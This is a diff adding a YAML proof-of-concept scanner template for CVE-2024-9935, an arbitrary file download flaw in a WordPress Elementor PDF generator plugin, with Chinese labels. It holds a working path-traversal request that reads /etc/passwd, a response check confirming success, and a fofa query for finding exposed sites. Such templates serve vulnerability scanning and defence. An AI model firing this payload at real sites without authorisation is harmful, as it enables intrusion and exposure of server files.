@@ -1,0 +1,17 @@
+id: poc-yaml-wordpress-plugin-pdf-gafepb-anyflie-download
+info:
+  name: WordPress Elementor页面生成器插件 PDF生成器 任意文件下载漏洞(CVE-2024-9935)
+  severity: high
+  tags:
+  - CVE-2024-9935
+  - 任意文件或目录访问
+  finger: pdf-generator
+  fofa: body="wp-content/plugins/pdf-generator-addon-for-elementor-page-builder/"
+requests:
+- method: GET
+  path: /elementor-84/?rtw_generate_pdf=true&rtw_pdf_file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+  expression: "status_code == 200 && \ncontains(body,\"root:\") &&\ncontains(body,\"\
+    /bin\") &&\ncontains(headers,\"filename=\") &&\ncontains(content_type,\"application/pdf\"\
+    )\n"
+variables: {}
+transport: http
